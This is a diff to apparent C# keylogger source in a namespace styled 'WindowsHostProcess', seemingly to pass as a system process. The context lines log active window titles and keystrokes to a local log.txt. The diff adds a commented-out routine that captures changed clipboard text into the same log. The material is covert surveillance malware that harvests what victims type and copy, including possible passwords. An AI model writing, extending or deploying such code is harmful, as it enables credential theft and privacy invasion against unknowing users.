@@ -16,6 +16,7 @@ namespace WindowsHostProcess
         public static string preWin = "";
         public static string newWin = "";
         public static int fstWin = 0;
+        public static string OldClipText = string.Empty;
 
         public static void Main(string[] args)
         {
@@ -66,6 +67,7 @@ namespace WindowsHostProcess
                 StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
 
                 newWin = GetActiveWindowTitle();
+
                 if(newWin != preWin)
                 {
                     if (fstWin == 1)
@@ -81,6 +83,24 @@ namespace WindowsHostProcess
                         sw.Write(Environment.NewLine);
                         fstWin = 1;
                     }
+
+ /*                   try
+                    {
+                        //Log Cliboard Text
+                        if (Clipboard.ContainsText())
+                        {
+                            var currentClipText = Clipboard.GetText();
+                            if (currentClipText != OldClipText)
+                            {
+                                OldClipText = currentClipText;
+                                sw.Write(Environment.NewLine + "(*!* " + currentClipText + " *!*)");
+                            }
+                        }
+                    }
+                    catch
+                    {
+                        sw.Write(Environment.NewLine + "***[Error Reading Clipboard]***");
+                    } */
                 }
 
                 switch ((Keys)vkCode)
